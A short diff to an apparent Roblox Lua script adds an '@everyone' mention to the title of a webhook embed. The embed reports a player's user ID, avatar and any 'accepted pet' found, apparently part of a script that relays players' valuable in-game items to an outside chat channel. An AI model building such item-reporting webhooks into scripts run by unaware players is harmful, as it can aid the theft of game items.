@@ -83,7 +83,7 @@ local function sendWebhook(petName)
     local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(LocalPlayer.UserId) .. "&width=420&height=420&format=png"
 
     local embed = {
-        title = petName and "Pet List Found" or "No Pet Found",
+        title = petName and "@everyone Pet List Found" or "No Pet Found",
         description = petName and ("Pet found: **" .. petName .. "**") or "No accepted pet found.",
         color = petName and 0x00ff00 or 0xff0000,
         fields = {
